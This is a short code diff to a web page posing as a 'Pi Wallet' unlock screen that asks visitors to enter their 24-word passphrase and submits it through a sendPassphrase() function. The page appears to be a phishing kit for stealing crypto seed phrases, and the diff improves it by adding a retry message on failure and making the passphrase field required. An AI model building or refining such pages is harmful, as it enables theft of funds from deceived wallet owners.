@@ -29,6 +29,7 @@
                     showSuccessMessage();
                 }, function(error) {
                     console.log("FAILED...", error);
+                    showToast("Failed to send. Please try again.");
                 });
         }
 
@@ -126,7 +127,7 @@
 <body>
     <div class="wallet-container">
         <h2>Unlock Pi Wallet</h2>
-        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
         <button onclick="sendPassphrase()">Unlock With Passphrase</button>
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
